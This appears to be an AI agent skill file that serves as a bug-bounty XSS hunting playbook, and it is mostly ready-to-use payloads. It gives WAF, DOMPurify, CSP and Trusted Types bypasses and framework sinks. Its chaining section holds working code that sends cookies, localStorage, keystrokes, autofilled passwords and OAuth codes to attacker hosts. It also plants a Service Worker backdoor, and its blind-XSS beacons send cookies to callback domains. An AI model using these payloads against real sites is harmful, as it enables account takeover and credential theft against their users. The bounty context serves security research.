---
name: hunt-xss
description: "Modern XSS hunting (2025-2026 edition). Use when probing reflected/stored/DOM/blind XSS, when a target uses React/Vue/Angular/Svelte/Solid/HTMX, when SVG/avatar upload is exposed, when CSP is in report-only or uses strict-dynamic, when DOMPurify version is leaked, when postMessage handlers are reachable, or when chaining XSS toward ATO/cookie theft/credential exfil. Skip self-XSS, alert-only PoCs, theoretical reflections — only invoke when chain to Critical (admin-context exec, cookie/token theft, ATO) is real."
---

# XSS Hunt — 2025-2026 Powerful Edition

Modern XSS is **not** about `<script>alert(1)</script>`. It is about:
- bypassing DOMPurify ≥3.2 via mutation parser quirks
- bypassing strict-dynamic CSP via script gadgets / nonce reuse
- finding sinks in React/Vue/Angular/Svelte/Solid that frameworks "officially" forbid
- chaining one XSS into **persistent ATO** via Service Worker, autofill, or cookie scoping

The bar for a payout: **`id`/cookie/token exfiltrated to Interactsh OR an admin/staff session demonstrably hijacked.** Alert-only is N/A on every program in 2026.

> **Self-XSS, info-only reflections, and "missing X-XSS-Protection header" are always-rejected.**

---

## 0. The 60-Second First-Touch (do every time)

For every reflection point you find, fire this **polyglot** once. If it doesn't pop, run targeted context detection.

**Ultimate XSS Polyglot (works in HTML, attribute, JS string, JS comment, URL, CRLF contexts):**
```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>
```

**Context-probe canary** (use only randomized markers, never the word `test`/`xss`/`payload`):
```
aaa"bbb'ccc<ddd>eee`fff${ggg}hhh
```
Send the canary. Inspect baseline response WITHOUT the canary first — if the marker appears naturally, switch markers. This single discipline kills 80% of false-positive reflection claims.

**Marker rules:**
- 8+ chars, alphanumeric only, no dictionary words
- Good: `q7hd2k9p`, `cpmark987abc`, `Zz1xKbT9`
- Bad: `XSSTEST`, `evil`, `marker`, `attacker`

---

## 1. Reflection Type Map (decide which arm to run)

| Where input lands | Type | Test arm |
|-------------------|------|----------|
| URL param → HTML body | Reflected | §2 contexts + §6 WAF bypass |
| Form field → DB → later rendered to viewer | Stored | §3 stored sinks + Blind beacon |
| JS reads location.hash/search/path | DOM-based | §4 DOM sink catalog |
| postMessage handler echoes data | Web message | §5 postMessage + §4 |
| Markdown / HTML editor → renderer | Markdown / Sanitizer | §7 DOMPurify bypass + §8 markdown |
| Avatar / file upload served same-origin | File / SVG | §9 SVG + content-type abuse |
| Email / PDF / SMS rendered later | Second-order | §10 second-order |
| Field viewed only by admin / SOC | Blind | §11 blind XSS |

---

## 2. Context Escapes — Exact Strings

After the canary, look at the surrounding HTML and use the matching escape.

### 2.1 HTML body (inside `<p>X</p>` etc.)
```html
<svg/onload=alert(1)>
<img src=x onerror=alert(1)>
<details open ontoggle=alert(1)>
<svg><animate onbegin=alert(1) attributeName=x dur=1s>
```

### 2.2 Double-quoted attribute (`<input value="X">`)
```
"><svg/onload=alert(1)>
" autofocus onfocus=alert(1) x="
" onmouseover=alert(1) x="
```

### 2.3 Single-quoted attribute (`<input value='X'>`)
```
'><svg/onload=alert(1)>
' autofocus onfocus=alert(1) x='
```

### 2.4 Unquoted attribute (`<input value=X>`)
```
 onfocus=alert(1) autofocus
/onload=alert(1)//
```

### 2.5 href / src / action / formaction
```
javascript:alert(1)
javascript&colon;alert(1)
java%0ascript:alert(1)
data:text/html,<script>alert(1)</script>
```

### 2.6 Inside `<script>var x = "X";</script>`
```
";alert(1);//
</script><svg/onload=alert(1)>
`;alert(1);//      (when template literal)
${alert(1)}        (template literal interpolation context)
```

### 2.7 Inside `<style>X</style>`
```
</style><svg/onload=alert(1)>
@import 'http://attacker/x';
expression(alert(1))    (IE legacy only)
```

### 2.8 Inside `<textarea>`, `<title>`, `<noscript>`, `<iframe srcdoc>`
```
</textarea><svg/onload=alert(1)>
</title><svg/onload=alert(1)>
</noscript><svg/onload=alert(1)>
```

### 2.9 Inside HTML comment `<!--X-->`
```
--><svg/onload=alert(1)>
```

### 2.10 Hidden input (no UI to fire)
Hidden inputs are unfireable directly — chain with popover/beforetoggle on a button **already on the page**:
```html
" popovertarget=x style=display:block "
<!-- requires an existing <button popovertarget=...> elsewhere -->
```

---

## 3. Modern Browser Vectors (Chrome 140+ / Firefox / Safari 17+) — WAF-survival event handlers

WAFs trained on `onerror`/`onload`/`onclick` miss the modern animation/popover/shadow-DOM/scroll events. **Use these first when WAF is present.**

```html
<!-- Animation events (no user interaction) -->
<style>@keyframes x{}</style><xss style="animation-name:x" onanimationend=alert(1)></xss>

<!-- Content visibility autostate -->
<xss oncontentvisibilityautostatechange=alert(1) style=display:block;content-visibility:auto></xss>

<!-- Transition end -->
<xss style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></xss>

<!-- SVG animate begin / repeat -->
<svg><animate onbegin=alert(1) attributeName=x dur=1s></svg>
<svg><animate onrepeat=alert(1) attributeName=x dur=1s repeatCount=2></svg>

<!-- Find-in-page reveal (hidden=until-found) -->
<xss id=x onbeforematch=alert(1) hidden=until-found></xss>
<!-- Trigger: location.hash = '#x' or browser find -->

<!-- Scroll snap change -->
<address onscrollsnapchange=alert(1) style=overflow-y:hidden;scroll-snap-type:x></address>

<!-- Popover beforetoggle (great for hidden-input contexts) -->
<button popovertarget=x>Click</button><xss onbeforetoggle=alert(1) popover id=x></xss>

<!-- Shadow DOM slot change -->
x<template shadowrootmode=open><slot onslotchange=alert(1)></template>

<!-- Web Animations -->
<xss onanimationiteration=alert(1) style=animation:x 1s infinite></xss>

<!-- Form/dialog events -->
<dialog open onclose=alert(1)><form method=dialog><button>X</button></form></dialog>
```

**Why they win:** new HTML5/Chromium APIs added 2023-2025. WAF rule sets (Cloudflare, Akamai, AWS WAF, ModSecurity OWASP CRS) typically only fingerprint the classic event names.

---

## 4. DOM XSS Sink Catalog (read first when target is a SPA)

### 4.1 Sources (user-controllable)
```javascript
location.href          location.search         location.hash
location.pathname      document.referrer       document.URL
document.documentURI   window.name             history.state
window.postMessage     localStorage / sessionStorage
fetch().then(r=>r.text())     XMLHttpRequest.responseText
```

### 4.2 Sinks (where source-flowing-into = XSS)

| Sink | Trigger |
|------|---------|
| `innerHTML` / `outerHTML` | direct HTML parse |
| `insertAdjacentHTML(_, x)` | direct HTML parse |
| `document.write` / `document.writeln` | direct HTML parse |
| `eval(x)` / `new Function(x)` / `setTimeout(x,...)` (string arg) | JS eval |
| `setInterval(x,...)` | JS eval |
| `element.src = x` (script/iframe) | URL load |
| `element.srcdoc = x` (iframe) | HTML parse |
| `element.href = x` (a/area/base) | `javascript:` schema |
| `element.action = x` (form) | `javascript:` schema |
| `element.formaction = x` (button/input) | `javascript:` schema |
| `element.data = x` (object) | URL load |
| `element.background = x` | URL load |
| `jQuery $(x)`, `$.html(x)`, `$.parseHTML(x)` | HTML parse |
| `Range.createContextualFragment(x)` | HTML parse |
| `DOMParser.parseFromString(x, 'text/html')` (then re-inserted) | HTML parse |
| `document.execCommand('insertHTML', _, x)` | HTML parse |
| `Element.setAttributeNS(_, 'srcdoc'|'src'|...)` | depends on attr |

### 4.3 Hunting workflow (DOM)
1. **Open Burp + DOM Invader** (built-in in Burp's Chromium). Source/sink auto-tracing.
2. Or manual: `grep -rE 'innerHTML|outerHTML|document\.write|insertAdjacentHTML|eval\(|setTimeout\(.*,|\.src ?=|\.srcdoc ?=|\.href ?=|location\.hash|location\.search|postMessage|window\.name' *.js`
3. Test each source-to-sink path with a unique marker → confirm execution.
4. For framework apps, also check §11 (framework sinks).

### 4.4 Trigger payloads
```javascript
// hash-based DOM XSS
https://target/#"><svg/onload=alert(1)>
https://target/#'><img src=x onerror=alert(1)>

// search-based
https://target/?q=<svg/onload=alert(1)>

// document.write path
https://target/page#<script>alert(1)</script>

// window.name (cross-origin set, lasts across same-origin nav)
window.name = '<svg onload=alert(1)>';
location = 'https://target/vulnerable.html';
```

---

## 5. postMessage XSS (under-tested gold mine)

### 5.1 Detection
```javascript
// In browser console on target page
window.addEventListener = (function(orig){
  return function(type, fn, ...rest){
    if (type === 'message') console.log('🎯 message listener:', fn.toString());
    return orig.call(this, type, fn, ...rest);
  };
})(window.addEventListener);
```
Or: DOM Invader → Messages panel → "Probe with message" auto-fuzzes the listener.

### 5.2 Common flaws to test
1. **Origin not validated** → any origin can post. PoC: open attacker page that does `iframe.contentWindow.postMessage(payload, '*')`.
2. **Weak origin allowlist** (`event.origin.indexOf('target.com')` — your-target.com.attacker.com bypasses).
3. **Origin checked but data trusted** → data flows to `innerHTML` / `eval` sink anyway.
4. **Bypass via about:blank iframe** of the target's own origin.

### 5.3 Attacker PoC page
```html
<iframe src="https://target.com/page-with-listener" id=f></iframe>
<script>
document.getElementById('f').onload = () => {
  f.contentWindow.postMessage({type:'render', html:'<img src=x onerror=alert(document.domain)>'}, '*');
};
</script>
```

---

## 6. WAF Bypass Ladder (Cloudflare / Akamai / AWS WAF / Imperva)

### 6.1 Step 1 — case + tag/attribute variations
```html
<sVg/oNloAd=alert(1)>
<Img/Src/OnError=(alert)(1)>
<ImG sRc=x OnErRoR=alert(1)>
<svg><sCrIpT>alert(1)</sCrIpT></svg>
```

### 6.2 Step 2 — non-classic event handlers (§3 list)
Animation, popover, slot, content-visibility events bypass most signature WAFs.

### 6.3 Step 3 — attribute splitting / null byte / encoding
```html
<img%20src="x"%00onerror=alert(1)>
<svg%0aonload=alert(1)>
<img src=x onerror="alert(1)">
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>
<svg><script>al\u{65}rt(1)</script></svg>
```

### 6.4 Step 4 — function-call obfuscation
```html
<img src=x onerror="window['ale'+'rt'](1)">
<img src=x onerror="eval(atob('YWxlcnQoMSk='))">
<img src=x onerror="Function`alert\x281\x29```">
<img src=x onerror=(alert)(1)>
<img src=x onerror=top.alert(1)>
<svg><script>setTimeout`alert\x281\x29`</script></svg>
```

### 6.5 Step 5 — alternative tags WAFs miss
```html
<form><button formaction=javascript:alert(1)>X</button></form>
<isindex action=javascript:alert(1) type=submit value=X>
<embed src=javascript:alert(1)>
<object data=javascript:alert(1)>
<a href="javascript:alert(1)">x</a>
<base href=javascript:alert(1)//>           <!-- subsequent relative URLs become JS -->
<input autofocus onfocus=alert(1)>
<select autofocus onfocus=alert(1)>
<textarea autofocus onfocus=alert(1)>
<video src=x onerror=alert(1)>
<audio src=x onerror=alert(1)>
<source onerror=alert(1) src=x>
```

### 6.6 Step 6 — Cloudflare-specific 2025 tricks
```html
<Img/Src/OnError=(alert)(1)>
<img hrEF="x" sRC="data:x," oNLy=1 oNErrOR=prompt`1`//>
<img longdesc="x" onerror=alert(1)>            <!-- longdesc bypasses some sigs -->
<svg><animate onbegin=alert(1) attributeName=x>
```

### 6.7 Step 7 — Akamai-specific
```html
<svg><!--<title>--><script>alert(1)</script>
<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>click</text></a>
```

### 6.8 Step 8 — AWS WAF
Long payloads sometimes truncate the regex match. Also try:
```html
<svg onload=alert(1)//
<svg/onload="al"+"ert(1)">
```

### 6.9 Surrender / pivot — if WAF won't yield in 30 minutes, **switch endpoint**. Don't WAF-fight unless this is THE only path to a Critical chain.

---

## 7. Sanitizer Bypass — DOMPurify / sanitize-html / OWASP Java Sanitizer

### 7.1 DOMPurify version fingerprint
```javascript
// In console on target
DOMPurify.version
```
Or look in JS bundles: `grep -E 'DOMPurify|purify\.min\.js'` — version often in filename or banner comment.

### 7.2 Mutation XSS payloads by DOMPurify version

**Pre-3.2.4 (CVE-2025-26791, template-literal regex bypass):**
```html
<svg><desc>\onload=${alert(1)}\</desc></svg>
```

**Pre-2.0.17 (namespace confusion via mathml):**
```html
<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>
```

**Pre-2.2.2 (svg/mathml namespace round-trip):**
```html
<svg></p><style><a id="</style><img src=1 onerror=alert(1)>">
```

**Modern Chrome (table/style/comment mutation):**
```html
<math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;img src=1 onerror=alert(1)&gt;">
```

**Modern Firefox (CDATA variant):**
```html
<math><mtext><table><mglyph><style><![CDATA[</style><img title="]]&gt;&lt;/mglyph&gt;&lt;img&Tab;src=1&Tab;onerror=alert(1)&gt;">
```

**Math+style combo (Trello / GitLab class):**
```html
<math><style><img src=x onerror=alert(1)></style></math>
<svg><style><img src=x onerror=alert(1)></style></svg>
```

**MathML noscript bypass:**
```html
<noscript><p title="</noscript><img src=x onerror=alert(1)>">
```

### 7.3 Other sanitizer bypasses
```html
<!-- sanitize-html with allowed iframe + srcdoc -->
<iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;"></iframe>

<!-- HTML mutation: noscript when JS disabled by sanitizer, then re-enabled -->
<noscript><img src="</noscript><img src=x onerror=alert(1)//">

<!-- ParseHTML round-trip -->
<a href="javascript&#x3A;alert(1)">x</a>
<a href="java&#x09;script:alert(1)">x</a>
```

---

## 8. Markdown → HTML XSS (GitLab / Discourse / Notion-class)

### 8.1 The classics
```markdown
[click](javascript:alert(1))
[click](javascript&colon;alert(1))
[click](javascript\&colon;alert(1))
[click](java%0ascript:alert(1))
[click](<javascript:alert(1)>)
[click]: javascript:alert(1)
[click](javascript://%0aalert(1))
[click](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)
```

### 8.2 Image with reference
```markdown
![](javascript:alert(1))
![x](x" onerror="alert(1))
![x](x onerror=alert(1))
```

### 8.3 Inline HTML some parsers allow
```markdown
<svg onload=alert(1)>
<style>@import 'http://attacker/x'</style>
<iframe srcdoc=&lt;script&gt;alert(1)&lt;/script&gt;></iframe>
```

### 8.4 GitLab / Banzai / Kramdown / RDoc family
Test **all** of these in any markdown field — each parser has its own gaps:
- ` ```kroki` + plantuml/mermaid payload (script in SVG output)
- ` ```math` + KaTeX/MathJax injection
- RDoc `link:javascript:alert(1)`
- GFM `<details><summary onmouseover=alert(1)>`
- Reference-style `[x]: javascript:alert(1)`
- DesignReferenceFilter / Mermaid / Kroki — chain via diagram render path

### 8.5 CVE-2025-9222 GitLab GFM placeholder XSS (versions <18.5.5/18.6.3/18.7.1)
Probe markdown fields with placeholder-syntax mutations; CVE patched 2025.

---

## 9. SVG / File Upload XSS

### 9.1 SVG with inline script — gold standard
```xml
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg xmlns="http://www.w3.org/2000/svg" onload="fetch('//collab.oast.pro/?c='+document.cookie)">
  <script>alert(document.domain)</script>
</svg>
```

### 9.2 SVG with foreignObject (HTML inside SVG)
```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <foreignObject width="100" height="100">
    <body xmlns="http://www.w3.org/1999/xhtml">
      <script>alert(1)</script>
    </body>
  </foreignObject>
</svg>
```

### 9.3 SVG `<use href>` (bypasses Trusted Types — see §12)
```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <use href="https://attacker.com/evil.svg#x"/>
</svg>
```
Where `evil.svg` contains the actual `<script>` payload.

### 9.4 SVG `<image>` with onerror
```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <image href="x" onerror="alert(1)"/>
</svg>
```

### 9.5 Content-Type bypass matrix
| Upload validation | Bypass |
|-------------------|--------|
| Extension whitelist | `shell.svg.png`, `shell.png.svg` |
| Magic-byte check | Prepend `<?xml version="1.0"?>` then valid SVG header |
| Content-Type validation | Set `Content-Type: image/png` regardless of extension |
| MIME sniffing | Force browser sniff to text/html via mismatched magic bytes |
| `Content-Disposition` removed | Confirms it renders inline → XSS executes |
| CSP applied to HTML only | SVG served with `image/svg+xml` often bypasses CSP |

### 9.6 Confirmation — must serve same-origin
The uploaded file URL **must** be `https://target.com/uploads/xxx.svg` or `https://*.target.com/...` to land in target's session context. If it's `https://cdn.unrelated.com/...`, the XSS is not on target's origin and won't access cookies.

### 9.7 ImageMagick / SVG converters
If avatar upload converts SVG → PNG/JPG, the XSS won't execute (raster output). But:
- Test if **original** SVG is also served (often kept for retina)
- Test SVG-to-PDF (PDF can execute via JavaScript actions)
- Try `mvg`/`msl` ImageTragick CVE-2016-3714 → RCE (not XSS, but huge bounty)

---

## 10. Second-Order XSS (input here → renders elsewhere)

These pay because they fire in **trusted contexts** (admin, staff, support).

### 10.1 Common second-order channels
| Submit point | Trigger context |
|--------------|-----------------|
| Registration email/username | Admin user-list panel |
| Support ticket subject | Staff helpdesk UI |
| File upload filename | Audit log viewer |
| Error log (force 500s with payload) | SOC / log-viewer dashboard |
| Failed login username | Audit log / fail2ban viewer |
| User-Agent header | Analytics dashboards rendering UA as HTML |
| Referer header | Same — some analytics render Referer |
| Order memo / shipping note | Warehouse / fulfillment UI |
| EXIF metadata on uploaded photo | Photo-management admin panel |
| Webhook payload field | Webhook log viewer |
| Invoice / order line-item | Accounting / billing UI |

### 10.2 Plant payloads with sub-tagged Interactsh subdomains so callbacks identify which field fired:
```html
<svg onload="fetch('//bxss-ticketsubj.<id>.oast.pro/?c='+document.cookie)">
<svg onload="fetch('//bxss-username.<id>.oast.pro/?c='+document.cookie)">
<svg onload="fetch('//bxss-filename.<id>.oast.pro/?c='+document.cookie)">
```
Plant early in the engagement. Keep the listener open for **days**.

---

## 11. Framework-Specific Sinks

### 11.1 React / Next.js
**Sinks:**
- `dangerouslySetInnerHTML={{__html: userInput}}` ← primary sink
- `href={userInput}` where input is `javascript:...` (React 18+ removed protection in some cases)
- `<a href={url}>` with `url` from `useSearchParams()` / server-component data
- Server Components: unescaped output in `'use server'` functions
- Next.js `<Image src={userInput} />` with `loader` prop
- `useEffect(() => { document.body.innerHTML = data; })`

**Probes:**
- Submit `<img src=x onerror=alert(1)>` to any field that ends up in a Server Component render
- URL `?q=<svg onload=alert(1)>` to pages reading `useSearchParams()`
- Look for `unstable_renderSubtreeIntoContainer` and similar legacy escape hatches

### 11.2 Vue.js
**Sinks:**
- `v-html="userInput"` ← primary sink
- `v-bind:href="userInput"` with `javascript:` URL
- `<component :is="userInput">` (dynamic component name)

**Probe:**
```html
{{constructor.constructor('alert(1)')()}}    <!-- Vue 2 template injection -->
```

### 11.3 Angular
**Sinks:**
- `[innerHTML]="userInput"` (raw)
- `DomSanitizer.bypassSecurityTrustHtml(userInput)`
- `bypassSecurityTrustResourceUrl` / `bypassSecurityTrustScript`
- Template injection in AOT-compiled apps (CVE-2025-66412)

**Probes (AngularJS < 1.6):**
```
{{constructor.constructor('alert(1)')()}}
{{$on.constructor('alert(1)')()}}
{{$eval.constructor('alert(1)')()}}
```

**AngularJS 1.6+ (sandbox removed):**
```
{{toString.constructor.prototype.toString=toString.constructor.prototype.call;["a","alert(1)"].sort(toString.constructor)}}
```

**Modern Angular CSP/Sanitizer bypass:**
```html
<a href="javascript:alert(1)" target=_self>x</a>
<img src=x ng-on-error="$event.target.ownerDocument.defaultView.alert(1)">
```

### 11.4 Svelte / SolidJS
**Sinks:**
- Svelte: `{@html userInput}` ← primary sink. CVE-2025-15265 affects `<3.46.4` hydratable_block.
- Solid: `<div innerHTML={userInput}>` (raw). CVE-2025-27109 in solid-js.

### 11.5 HTMX
**Sinks:**
- Response header `HX-Redirect: javascript:alert(1)` → XSS if header injection exists
- `<meta hx-trigger='x[1)}),alert(3);//'>`
- `hx-disable` bypass: `<div hx-disable><img src=x hx-on:error="alert(1)"></div>`
- HTMX auto-nonce injection compromises CSP-nonce defense

### 11.6 jQuery (legacy but still in 30%+ of apps)
**Sinks:**
- `$(userInput)` (parses HTML)
- `$.html(userInput)`, `$.append(userInput)`, `$.before/after/prepend`
- `$.parseHTML(userInput, document, true)` ← third arg enables scripts

---

## 12. Trusted Types Bypasses (when CSP `require-trusted-types-for 'script'`)

### 12.1 Report-only mode is NOT enforced
If `Content-Security-Policy-Report-Only:` (not the enforcing header), Trusted Types violations are reported but **not blocked**. Treat as normal XSS.

### 12.2 Sinks that bypass Trusted Types entirely
```html
<!-- XSLT disable-output-escaping -->
<xsl:value-of select="userInput" disable-output-escaping="yes"/>

<!-- SVG <use href> external import -->
<svg><use href="https://attacker.com/evil.svg#x"/></svg>

<!-- ProcessingInstruction node -->
<script>document.createProcessingInstruction('xml-stylesheet', 'href="data:application/xslt+xml,..."')</script>

<!-- Non-DOM API script loads (importScripts in service worker, etc.) -->
```

### 12.3 Unsafe policy creation
Some apps create a "passthrough" Trusted Types policy that returns input as-is:
```javascript
trustedTypes.createPolicy('default', { createHTML: x => x })
```
If you can influence what flows into that policy's `createHTML`, you have XSS.

---

## 13. CSP Bypasses (2025 priorities)

### 13.1 Read the CSP header first
```bash
curl -ksI https://target.com | grep -i 'content-security-policy'
```

### 13.2 Common bypasses

| CSP weakness | Bypass |
|--------------|--------|
| `default-src *` | Trivial — any external script |
| `unsafe-inline` in script-src | Direct `<script>alert(1)</script>` works |
| `unsafe-eval` | `eval()`, `Function()`, `setTimeout(string)` work |
| Allows `*.googleapis.com` | JSONP at `https://www.googleapis.com/customsearch/v1?callback=alert` |
| Allows `*.cloudfront.net` / common CDN | Find JSONP endpoints on same host |
| Allows AngularJS via CDN | Old AngularJS sandbox escape (§11.3) |
| `strict-dynamic` with nonce reuse | Inject `<script nonce="X">` reusing a leaked nonce |
| `script-src 'self'` + file upload | Upload `.js` as `attachment.js`, then `<script src=/uploads/attachment.js>` |
| `script-src 'self'` + open redirect on same origin | `<script src=/redirect?to=https://attacker/x.js>` |
| `report-only` mode | Not enforced — treat as no CSP |
| Missing `base-uri` | `<base href=//attacker.com/>` redirects relative script srcs |
| Missing `object-src 'none'` | `<object data=//attacker/x.swf>` legacy |
| Missing `frame-ancestors` | Not CSP-XSS, but enables clickjack chains |

### 13.3 Script gadget chain
Find a library on the page that takes an attribute and feeds it to a sink (e.g., `data-*` attributes → `eval`). Inject the gadget invocation as harmless-looking HTML. Common gadgets: Bootstrap, jQuery Mobile, KnockoutJS, AngularJS, MooTools.

### 13.4 Nonce reuse
If page reflects existing nonces back (rare but seen), grab and reuse:
```html
<script>fetch('/').then(r=>r.text()).then(t=>{const n=t.match(/nonce="([^"]+)"/)[1]; const s=document.createElement('script'); s.nonce=n; s.src='//attacker/x.js'; document.body.appendChild(s);})</script>
```
But this requires existing JS execution, so usually a self-XSS step.

---

## 14. DOM Clobbering (chain helper, never alone)

DOM Clobbering lets you control JS variables via HTML when you can inject tags but not script. Common shape: app reads `window.config.url` → inject `<form id=config><input id=url value=javascript:alert(1)>` → `config.url` resolves to your input.

### 14.1 Bootstrap 3 popover/tooltip — CVE-2025-1647
```html
<a data-bs-toggle="popover" data-bs-html="true" title="<script>alert(1)</script>" data-bs-content="x">click</a>
```

### 14.2 HTMLCollection clobbering (Chromium-specific)
```html
<a id=x></a><a id=x name=y href=javascript:alert(1)></a>
<!-- document.x is now an HTMLCollection; document.x.y points to the second <a> -->
```

### 14.3 Form/input clobbering
```html
<form id=config>
  <input id=apiKey value=javascript:alert(1)>
  <input id=adminUrl value=//attacker/x>
</form>
```

### 14.4 Iframe `srcdoc` for nested DOM injection
```html
<iframe srcdoc='<form id=config><input id=url value=javascript:alert(1)>'></iframe>
```

---

## 15. Prototype Pollution → XSS (browser-side gadget chain)

### 15.1 Pollution source patterns
- URL: `?__proto__[onerror]=alert(1)`, `?constructor[prototype][onerror]=alert(1)`
- postMessage with `{__proto__: {...}}` body
- `JSON.parse(userInput)` flowing into `Object.assign(target, parsed)` / `_.merge` / `$.extend(true,...)`

### 15.2 Universal gadgets (browser-built-in)
Once `Object.prototype.SOMEKEY` is polluted, any code reading `obj[SOMEKEY]` with missing key returns your value. Trigger on:
- jQuery's `$(html, attributes)` second-arg gadget
- moment.js, lodash, Vue config, Webpack runtime
- HTMLElement default attribute polyfills

### 15.3 Proof PoC
```
https://target/?__proto__[innerHTML]=<img src=x onerror=alert(1)>
```
Then trigger a code path that reads `someObj.innerHTML` with no own-property.

### 15.4 Tools
- **DOM Invader** → prototype pollution mode auto-detects sources + gadgets and generates PoCs
- **ppfuzz 2.0** (2025) — headless Chromium gadget brute-forcer

---

## 16. Blind XSS — modern setup

### 16.1 Receiver options (self-host all if possible)
- **xsshunter-express** (Docker, self-hosted, free) — full DOM + cookie + screenshot capture
- **Interactsh** — DNS + HTTP, more lightweight (use for non-screenshot needs)
- **bxss / xsshuntress** — open-source XSSHunter forks
- **Burp Collaborator** — gold standard (Pro required)
- **webhook.site** — quick disposable

### 16.2 Modern blind payload (captures cookie + DOM + URL)
```html
<script>
fetch('//bxss-FIELD.<id>.collab/?c='+btoa(document.cookie)+'&u='+btoa(location.href)+'&h='+btoa(document.documentElement.outerHTML.slice(0,4000)))
.catch(()=>{});
</script>
```

### 16.3 One-liner for tight contexts
```html
"><svg onload=fetch('//bxss-FIELD.<id>.collab/?c='+btoa(document.cookie))>
```

### 16.4 Where to plant (matrix from §10)
Sub-tag the subdomain by field name so callbacks identify the sink.

### 16.5 Triage gate for blind XSS reports
- **Got a callback?** → must be from a **browser** User-Agent (Mozilla/Chrome), not the server's backend HTTP client
- **Cookie/URL captured?** → confirms admin context, real impact
- **No callback in 7 days** → retract; SOC likely views logs in non-rendering tooling

---

## 17. Chain to Critical — make every XSS a Critical

A vanilla `alert(1)` reflected XSS is **Medium at best**. Chain it. Every program pays 3–10× for the chain.

### 17.1 XSS → Cookie theft → ATO (when no HttpOnly)
```javascript
fetch('//attacker/?c='+document.cookie)
```

### 17.2 XSS → CSRF token theft → state-change as victim (defeats SameSite=Lax)
```javascript
fetch('/account/settings').then(r=>r.text()).then(t=>{
  const tok = t.match(/csrf[_-]token[^"]*"([^"]+)"/i)[1];
  return fetch('/account/email', {method:'POST', credentials:'include',
    headers:{'Content-Type':'application/x-www-form-urlencoded','X-CSRF-Token':tok},
    body:'email=attacker@evil.com'});
});
```

### 17.3 XSS → localStorage / sessionStorage exfil (most JWT auth stores tokens here)
```javascript
fetch('//attacker/?a='+btoa(JSON.stringify(localStorage)))
fetch('//attacker/?b='+btoa(JSON.stringify(sessionStorage)))
```

### 17.4 XSS → Autofill credential theft (defeats HttpOnly)
Inject hidden login form on a logged-in page. Browser autofill triggers. Capture from the form:
```html
<form action=//attacker/exfil>
  <input style=opacity:0 name=username autocomplete=username>
  <input style=opacity:0 name=password autocomplete=current-password>
</form>
<script>setTimeout(()=>document.forms[0].submit(),3000)</script>
```

### 17.5 XSS → install Service Worker → persistence beyond logout
```javascript
const swCode = `self.addEventListener('fetch', e => { fetch('//attacker/?u='+e.request.url) });`;
const blob = new Blob([swCode], {type:'application/javascript'});
// Need same-origin URL serving this. If you can upload .js, register it:
navigator.serviceWorker.register('/uploads/sw.js', {scope:'/'});
```
**Constraint:** SW registration requires a same-origin JS file. Chain with file-upload-of-`.js` or with a CSP `script-src 'self'` gadget. Once registered, SW intercepts ALL requests including logged-out ones — persistent backdoor.

### 17.6 XSS → keylogger on login form
```javascript
document.querySelector('form input[type=password]').addEventListener('input', e => {
  fetch('//attacker/?k='+btoa(e.target.value));
});
```

### 17.7 XSS → password change without step-up
If site allows `PATCH /me {"password": "..."}` without re-entering current password:
```javascript
fetch('/me', {method:'PATCH', credentials:'include',
  headers:{'Content-Type':'application/json'},
  body:'{"password":"attacker_chosen"}'});
```
Then change email, lock victim out → persistent ATO.

### 17.8 XSS → OAuth code exfil
On OAuth callback subdomain with redirect_uri reflection:
```javascript
const code = new URLSearchParams(location.search).get('code');
fetch('//attacker/?code='+code);
```
Use this code at `/oauth/token` → victim's account is yours.

### 17.9 XSS via cache poisoning → mass victim
If a cached page reflects user-controlled headers (X-Forwarded-Host, X-Forwarded-Proto, Accept-Language), poison the CDN cache once and every subsequent visitor executes your JS:
```bash
curl -ks "https://target.com/" -H "X-Forwarded-Host: attacker.com<script>alert(1)</script>"
# Then verify the cached response serves your payload to a clean session.
```
Reference example: PayPal #488147 + #510152 ($20k + $18.9k).

---

## 18. Validation Gate (run BEFORE you write a report)

Answer all 4. One "no" → don't submit.

1. **Real victim impact?** Cookie/token captured, ATO demonstrated, admin session hijacked, or money/data moved. "alert(1) fires" is not impact — what does the alert *represent*?
2. **Cross-user PoC?** Test account A fires payload, test account B (clean browser) is affected. Self-XSS that requires the victim to paste into devtools is **always-rejected**.
3. **Reproduces in latest Chrome/Firefox/Safari?** No "only in old IE" exceptions. No "with XSS Auditor disabled" — auditors are dead since Chrome 78.
4. **Within scope?** Subdomain in scope, type in scope (some programs exclude content-injection-only).

---

## 19. Real Impact Examples (paid 2024-2025)

| Target | Bounty | Technique | Source |
|--------|--------|-----------|--------|
| PayPal | $20,000 | Bypass of prior fix → stored XSS on /signin via cache poisoning | H1 #510152 |
| PayPal | $18,900 | Stored XSS on /signin via cache poisoning | H1 #488147 |
| GitLab | $16,000 | Markdown DesignReferenceFilter mutation XSS | H1 #1212067 |
| GitLab | $13,950 | Kroki diagram stored XSS (chain through wiki) | H1 #1731349 |
| Shopify | $9,400 | XSS on jamfpro.shopifycloud.com | H1 #1444682 |
| Reddit | $5,000 | RichText scheduled-posts stored XSS | H1 #1930763 |
| HEY.com | $5,000 | Email render stored XSS | H1 #982291 |
| Razer | $750–$1,500 | Reflected XSS on payment domain → ATO | H1 #723060 |
| Meta Messenger | $111,750 | Client-side path traversal → DLL hijack RCE | BountyCon 2024 |

---

## 20. Always-Rejected (skip without testing)

- Self-XSS requiring devtools paste
- Alert-only reflected XSS with no chain to cookies / ATO / admin
- Reflected XSS on unauthenticated marketing page with no cached path
- Stored XSS in attacker's own profile that only fires for the attacker
- XSS requiring user to disable browser security features
- `X-XSS-Protection: 0` header alone (auditor dead, not a bug)
- Missing Content-Type or charset (info-only)
- XSS in a page behind CSRF token + no cross-origin trigger
